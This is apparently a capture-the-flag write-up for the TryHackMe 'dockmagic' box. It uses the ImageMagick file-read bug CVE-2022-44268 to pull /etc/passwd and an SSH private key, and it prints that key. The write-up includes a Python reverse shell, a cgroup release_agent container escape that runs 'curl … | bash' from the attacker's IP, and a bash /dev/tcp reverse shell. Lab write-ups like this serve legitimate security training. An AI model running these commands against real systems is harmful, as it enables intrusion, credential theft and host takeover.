A fast writeup for the THM machine dockmagic

# Dockmagic
```
# : nmap -sC -sV -sT -T4 -p- -vv -oN box 10.10.29.56
Nmap scan report for 10.10.29.56
Host is up, received syn-ack (0.036s latency).
Scanned at 2023-11-11 08:02:41 CET for 19s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e6:b7:14:81:2d:c6:43:bd:f7:8e:ee:b3:7e:32:d3:09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuvjT4AgTVjR6E+1CBThlWTucFxLE6JxJwotQloRp4BrSf6bxbgFk+wJD9aphOO9wHgcXqdv+Od0R/HGwnmVd1ct1Y4OkoMOHpsXhn5mhrQWlIdkt10G2THFvvdX3Syy/ZpAD/H36w66Vi5o7kVYc2Pq8tb0b3nxwDI4so8yMM7MVAY4R9wNagVoykaOBKJ3IDpepQNZS3oU8WO/uNMnKZrU1rb83/fuuyW5aZEI3SokkSqkwEYMmOk7Sdz48x2iaz7OOYdD/7kv2oSmczgAAXeP7FcVy3IYwEExbU9kU0kN03XHy/mO1Ssc93pVaosuH9ZyEd4Ota4Lsm1ZEFUi9gIwgF6Q5aknO0E/cgoESHImi5bXTe/BF2kvInUs3vXFGpGS8YuEyR6cWQRbB1krI0vNOWOLcwAgdn2zlkfO28BIbJjXCsWWp0QtpA6367J+hDl4c6rjTnwK4jRYYVFxA8GDKwdE7o6XkGmOyYGDYdyQFru53YWQ8j0j8W1abc5FU=
|   256 7d:64:9d:6c:8d:24:9d:53:b4:7a:ac:c8:f9:da:8b:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBuFdTdwqaoydyKUTfo4LllMbvcTziGMS7wSAcxv23SFwJz/+VlJG0VP1coATFU0it3w08QnCbNoSm7BfyAKxO8=
|   256 d1:30:1a:39:c6:46:9a:47:91:12:c6:4d:0d:b9:4e:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFvShylzT9jSElU3g6ypZGQ9lE+tJ9LTF+/sxBK3Fyoi
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://site.empman.thm/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 11 08:03:00 2023 -- 1 IP address (1 host up) scanned in 20.19 seconds
```
port 80

cookies give:

_emp_man_session S78DktHh7PCF%2B5AKTsH%2BW78LSfvtIJNx8xL8IsT50BwhtHgJoXOuyJFdUagqFZC1pR7DNwf6dfbSk2MBY4Z0rTIIaHqC6R3tJY3qfsj2WeqKEmQssFMSPiXAia22TH9T57OUac6x6IjrywS1BPkg1Rn2pH3%2BuEN4eQ7S4OIef51s9HjMp8yulyb%2Fc4vD7gEmpcJORn5Or4pw1aPFOfXQYw1PiIVv7uF%2FUUIb9E5DyFaX7Ae6HbhhX%2FzoxDu3fx8z12SsnbyVbGGXURCLKSmI%2Ba7ftAioBcd11inrRJ7WcZUDIC7XjgKY%2FX7T1L7HDt3NmVvQoaE1o6gEU9hGbPholq4wbFtqMMO7PNNOMGF9IzDjlu7V3nCqMdst48evqJVubNCsKeUMe2M%3D--w1o1dx7OKZpglqpm--%2BnTZrHM9aTuH3Lvq42J5Cg%3D%3D

## create account

dead end. Editing account and upload image is the only thing I can find.

```
ffuf -u http://empman.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.empman.thm"

 :: Method           : GET
 :: URL              : http://empman.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.empman.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 255, Words: 56, Lines: 8, Duration: 35ms]
    * FUZZ: backup

[Status: 200, Size: 4611, Words: 839, Lines: 97, Duration: 42ms]
    * FUZZ: site
```

## Imagemagick

on backup.empman.thm there is an Imagemagic.zip

this version has a file read vulnerability CVE-2022-44268 with accompanying exploit on github

git clone CVE-2022-44268.....

download avatar png and convert it to a CVE-2022-44268 vulnarable image with


python3 CVE-2022-44268/CVE-2022-44268.py /etc/passwd

this creates output.png

check local if it works

convert output.png -resize "50%" leak.png

and leak.png contains the passwd contents.

identify -verbose leak.png > conv.txt

conv.txt contains the image bytes which you can decode with cyberchef or python bytes.fromhex (or burpsuite maybe, does that have a hex decoder?)

create new account and really important that output.png is uploaded when CREATING the image. Not when editing later, then your account becomes invalid.

So create the account, the image gets converted and your avatar image contains the passwd bytes on the server!


Download the image as passwd.png

identify -verbose passwd.png > conv.txt

and decode the hex

last line contains user emp

```
emp:x:1000:1000::/home/emp:/bin/bash
```

so there is an emp user which then must have a /home/emp homedir.

Considering there is an ssh port open then this user hopefully has the standard private key installed in $HOME/.ssh/idrsa

So generate a new output.png and create a new account.
```
python3 CVE-2022-44268/CVE-2022-44268.py /home/emp/.ssh/id_rsa
```
and we find the ssh key after decoding hex

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA3glFpOG0+kOeOYCn6ROReNgJp8UmmERd8ReBCn49QKfxuQ6Ccze6
tdwROLc4vJJJKxALHMZWbenaFqXRWFjs53Q8s6PlN/A67QkE+PbSeZ9t2s/eSRQGolHNmU
Jm8IGJKNcgn66DMkm0ympoq3I18FkJuSH/NJVBn6T0MUDSuLybQkyRSfXLyouj0lxnfx5A
nRJIK0cqig4LF6AcmYBDRuxKnHTYaE+R8chC+0vUFUT4WFhlHVayHwfvbYprFOdOnZU3c5
ShHSboyaMltSURxILIYZB6MuFsIZGxCXcKJUEGzpOX0XUjiyLWxHwdHgkF0gDoRD35GWmI
lnwxAQBQHyRN1+zUB43pg23lpNU8AtN+JYzoImLOCZe9TnaXijRYNvTSWW6Y2kcovDiyON
+Xdlx2mzHrOzviFI9rrCIDW8akt4sUSvN++dS3ox9ZKdSzKGGE/Vkht5dUG8p9GYtHbYFl
qXgCHkcjlYqVKOeZKvvY+FdvXOzpEfXmJrfancAxDyhNaO8rlwYozqUYqmnbeg0IUWtiK3
nowPZtIpECL9r6WXx9eQPcUz0tfkS9/QATJBDnAIf609FndGa4OVBvqkkAF7R/XXFWMYh8
ezLmOg0L6S3ARUUmbC5n1ISmNtYv9RheMRDD0/1eSLKHuRNljQuSMlu89EJTnoF+8j9fgD
cAAAdIOW0u9TltLvUAAAAHc3NoLXJzYQAAAgEA3glFpOG0+kOeOYCn6ROReNgJp8UmmERd
8ReBCn49QKfxuQ6Ccze6tdwROLc4vJJJKxALHMZWbenaFqXRWFjs53Q8s6PlN/A67QkE+P
bSeZ9t2s/eSRQGolHNmUJm8IGJKNcgn66DMkm0ympoq3I18FkJuSH/NJVBn6T0MUDSuLyb
QkyRSfXLyouj0lxnfx5AnRJIK0cqig4LF6AcmYBDRuxKnHTYaE+R8chC+0vUFUT4WFhlHV
ayHwfvbYprFOdOnZU3c5ShHSboyaMltSURxILIYZB6MuFsIZGxCXcKJUEGzpOX0XUjiyLW
xHwdHgkF0gDoRD35GWmIlnwxAQBQHyRN1+zUB43pg23lpNU8AtN+JYzoImLOCZe9TnaXij
RYNvTSWW6Y2kcovDiyON+Xdlx2mzHrOzviFI9rrCIDW8akt4sUSvN++dS3ox9ZKdSzKGGE
/Vkht5dUG8p9GYtHbYFlqXgCHkcjlYqVKOeZKvvY+FdvXOzpEfXmJrfancAxDyhNaO8rlw
YozqUYqmnbeg0IUWtiK3nowPZtIpECL9r6WXx9eQPcUz0tfkS9/QATJBDnAIf609FndGa4
OVBvqkkAF7R/XXFWMYh8ezLmOg0L6S3ARUUmbC5n1ISmNtYv9RheMRDD0/1eSLKHuRNljQ
uSMlu89EJTnoF+8j9fgDcAAAADAQABAAACAE2DUSPZg9OmjXMnnfa5VRyp1t0R74JSw7Tp
7quaHIoY10MydIoCl5TrabuyAwWZ0B9Pb4GxH/UpIXCsnKPKD5JRuus/uULJA9lCP9EmYZ
4B8VjlHoXGjvZVtn/ddZBauGZgi8wTIUwJ/Sp48WeA7KGmg8V0v+I8hPdVn8YeCjJh7ZW8
oy/9thJUo3FJvvvatNXgzv8Ezi357xdlVvajl1kIHpf2FqJ7vMh6kB+ofjaaqFQ3L72JSY
+ZtpU4MF/QzFopAH3CEmjZ74SNBxnxAf3nZkrhJDflCFnDwdk7DHiq9dRiJCsESM9G71ES
vxuALN7+YBeKxw5/ECbw3i6qTE2cYJy+1nLh/GcoG02xMQQn7vaX95HnVwE5CEHym/m89P
Tez9Jt8+UkGhu1GrH1aqzRi3eDJVgaDn7rhO89KwveVAhiU/UgvbUd2zp1nvj3SqGrljuV
B6eLZs0Nf66u7d80RfstbpRJnAFV6ig2+ost71j6MQ5gX2989G+wYHCw+pE0AU9wmxkDO6
SDtUCZmGir7f6I9C+rVDeFgWhUYNxO8O5kh20aJQgloUUHGRGYLE4fP27MjjpAgE1VofyG
KfZWEzTghrXhriwsxhOl+IJZO8U/AwxVIESp1GJ0+jqraXpx9ZWE1TRRhnjLug9FEnixR3
qIKRp48lfGAPDwP7KZAAABACKubN4BRDNpfUcm+hjGSIGD6ki85HqNb0MUaIByQmaiCpC7
5ikHJ9GkeggQUssDQX4hvamwr3eePAnglnqPVg9eGffG0S2/oXucMunPKxtocQzkk2bZbG
OQXk01jAoV9ZT8uY4QUKXug/TuNrffAkFNodQ0JLJTQpIcrpI/nusUYN5Wy+rzp/MMzzF3
Vaj+MOWTEhbDtguAqd47UOWQxl4a+WVrnRpCX1ZcEfipUPlzr8Wk8VIjP8B2EG056rCrFC
ursW/AJ9VN1g8t2UCpjvgcszMQqEXAk9tvM8Uke9/nxJjeRXvoYYeEDXEBeCnuWtfErp7X
/un9jciPxhGOQCQAAAEBAPNEy+nhlPfS/GnK1rORJr6a9DgE4PeezYa8vp0kWx93A0PH3C
G4ekk4jb4WSSYmf94lYxNRrG0+FO3YqW+HbovNMl+PsYy1RijBnzcFRVme1vDmoDJkNAuN
yKTKUQ4a4REU0cXl2+huZSDSIAjWWEL8ttqlVBrp378hpnSXJl3fsGbc8/0RAXJVNu9Z33
6WUblcZUFzxIJSevk6wHDIE7IlEiMW1g9/0KZz4odA6dRERwDlamyG1dybhnwIsQmJodTL
1vka4M/wvpsaor+eHo11g3Mpqs37loV/HeJJ8ZmfMgxfJduKrHSzXkTj4tgtx4E5Bto+oT
z9FFqtYmeTDOsAAAEBAOmoAw4W5O+h/T9nITIBzs/H8NwQVrOlvtL8WAFOnQdEBxrT+9H7
ElO5SfrYXn9Ii2MRcId01O/u7CDGnkiEqkTVxEYLQeHWpkK4xc8AYVP6Lis2ZBjRcl6qsX
35RhIhhpAOyX3tHFXdbSwDh0B1H3P2Qr7txEfyBEcJpMlmQMxHEu42jvNZ3TJLEyV5Giyu
xTVOu5pR2IKo+8vAiLWAVmnIyaeYAgMviXwzpIfm5UI7h9xq1ReJWsNpef8Oy9jycpKk5W
WQY5tXnt5GGj4s7M7t8sLgU2lXgTDQUUnmvfNloPWYTzkWL6kKZtFIRluaQzL1PYwJsO6d
WUL/F3/6VuUAAAARcm9vdEAzNmEwNGYyN2EwYjUBAg==
-----END OPENSSH PRIVATE KEY-----


chmod 0600 id_rsa
ssh -l emp -i id_rsa ${IP} and we are in.
```

first flag in homedir.

with linpeas and pspy64 we find a shell running as root running backup.py

```
CMD: UID=0    PID=11803  | /bin/sh -c PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log 
```

also very obiously is that PYTHONPATH has /dev/shm added at startup so python will look there first for imported modules.

Seeing that the script does an import cbackup we could create a revshell in /dev/shm/cbackup.py and wait for the script to trigger when it imports our cbackup.py

```
import socket, os, pty

class cbackup:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.6.179",10666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```
nc -lnvp ...

and container root shell

root@23348446b037:~# cat flag2.txt

## Container escape

In containers the best way to escape a container is always mounts

info found here and just follow the steps:

https://0xdf.gitlab.io/2021/05/17/digging-into-cgroups.html

* We're basically mounting a cgroup and then creating the x dir in the dir /tmp/cgrp.
* Then cgroup populates the dir automatically with files.
* We want to write a 1 to notify_on_release first.
* Get the location of the directory that the host writes to when files are created inside the container.
* Write a reverse shell inside the container.
* Then write an echo command to /tmp/cgrp/x/cgroup.procs, the example writes the current proc $$.
* This gets released on the host and that triggers your shell!


```
mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl 10.9.6.179/shell.sh | bash" >> /cmd
chmod a+x /cmd
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
```

shell.sh contains a bash shell to port 10667

bash -i >& /dev/tcp/10....179/10667 0>&1

so fire up another nc listening on 10667 and check if we are running on host as root with cat cmdline.
If the cmdline is init then we are running on an actual host!

root@dockmagic:/# cat /proc/1/cmdline
/sbin/init

last flag is in vagrant directory
